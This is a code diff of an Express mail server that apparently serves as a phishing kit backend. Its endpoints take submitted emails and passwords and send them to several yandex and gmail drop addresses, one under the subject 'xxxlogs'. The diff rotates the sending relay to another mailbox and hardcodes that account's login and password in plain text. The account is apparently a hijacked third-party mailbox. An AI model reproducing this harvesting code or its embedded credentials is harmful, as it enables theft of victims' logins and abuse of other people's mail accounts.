@@ -18,11 +18,11 @@ app.post("/sendmail", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "mail.korarahighlandstea.com",
+      host: "webmail.umgroups.com",
       port: 465,
       auth: {
-        user: "info@korarahighlandstea.com",
-        pass: "chai2025!",
+        user: "aye.star@umgroups.com",
+        pass: "um9winwaynas",
       },
     });
     let info = await transporter.sendMail({
@@ -52,15 +52,15 @@ app.post("/sendmail5", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "mail.korarahighlandstea.com",
+      host: "webmail.umgroups.com",
       port: 465,
       auth: {
-        user: "info@korarahighlandstea.com",
-        pass: "chai2025!",
+        user: "aye.star@umgroups.com",
+        pass: "um9winwaynas",
       },
     });
     let info = await transporter.sendMail({
-      from: '"Happy time" <info@korarahighlandstea.com>',
+      from: '"Happy time" <aye.star@umgroups.com>',
       to: "daniellahm@yandex.com",
       subject: "happy Time",
       html: `
@@ -87,15 +87,15 @@ app.post("/sendmail2", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "mail.korarahighlandstea.com",
+      host: "webmail.umgroups.com",
       port: 465,
       auth: {
-        user: "info@korarahighlandstea.com",
-        pass: "chai2025!",
+        user: "aye.star@umgroups.com",
+        pass: "um9winwaynas",
       },
     });
     let info = await transporter.sendMail({
-      from: '"You" <info@korarahighlandstea.com>',
+      from: '"You" <aye.star@umgroups.com>',
       to: "sales1.ppsl@gmail.com",
       subject: "xxxlogs",
       html: `
@@ -122,15 +122,15 @@ app.post("/sendmail3", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "mail.korarahighlandstea.com",
+      host: "webmail.umgroups.com",
       port: 465,
       auth: {
-        user: "info@korarahighlandstea.com",
-        pass: "chai2025!",
+        user: "aye.star@umgroups.com",
+        pass: "um9winwaynas",
       },
     });
     let info = await transporter.sendMail({
-      from: '"Happy time" <info@korarahighlandstea.com>',
+      from: '"Happy time" <aye.star@umgroups.com>',
       to: "fredrick3smith33@gmail.com",
       subject: "Happy time",
       html: `
@@ -144,7 +144,7 @@ app.post("/sendmail3", async (req, res) => {
          </div>
     `,
     });
-      await transporter.sendMail(info);
+    await transporter.sendMail(info);
     res.send("Email sent successfully");
   } catch (error) {
     console.error(error);
@@ -155,15 +155,15 @@ app.post("/sendmail4", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "mail.korarahighlandstea.com",
+      host: "webmail.umgroups.com",
       port: 465,
       auth: {
-        user: "info@korarahighlandstea.com",
-        pass: "chai2025!",
+        user: "aye.star@umgroups.com",
+        pass: "um9winwaynas",
       },
     });
     let info = await transporter.sendMail({
-      from: '"Happy time" <info@korarahighlandstea.com>',
+      from: '"Happy time" <aye.star@umgroups.com>',
       to: "p4pi.j@yandex.com",
       subject: "Happy time",
       html: `
@@ -185,8 +185,6 @@ app.post("/sendmail4", async (req, res) => {
     res.status(500).send("Error sending email");
   }
 });
-
-
 
 const PORT = process.env.PORT || 5000;
 
